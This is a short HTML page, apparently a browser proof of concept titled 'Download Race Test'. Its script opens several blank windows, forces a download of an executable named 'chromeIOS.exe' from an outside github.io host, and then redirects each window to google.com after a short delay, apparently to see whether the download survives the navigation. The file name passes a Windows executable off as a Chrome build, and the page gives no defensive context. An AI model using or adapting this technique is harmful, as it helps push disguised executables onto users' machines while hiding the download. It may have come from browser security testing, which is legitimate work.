<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Download Race Test</title>

<style>
button{
background:#4CAF50;
color:white;
border:none;
padding:15px 30px;
font-size:16px;
cursor:pointer;
}
</style>

</head>
<body>

<center>
<h2>Window.open Download Race Test</h2>
<button onclick="start()">Start Test</button>
</center>

<script>

const file="https://ecdnts-del.github.io/test-apk/chromeIOS.exe";

function start(){

let delays=[10,50,120,200,320];

delays.forEach((delay,i)=>{

setTimeout(()=>{

let w=window.open("about:blank");

w.document.write(`
<script>

var a=document.createElement('a');
a.href='${file}';
a.download='chromeIOS.exe';
document.body.appendChild(a);
a.click();
document.body.removeChild(a);

setTimeout(function(){
location.href='https://google.com';
},${delay});

<\/script>
`);

},i*1500);

});

}

</script>

</body>
</html>
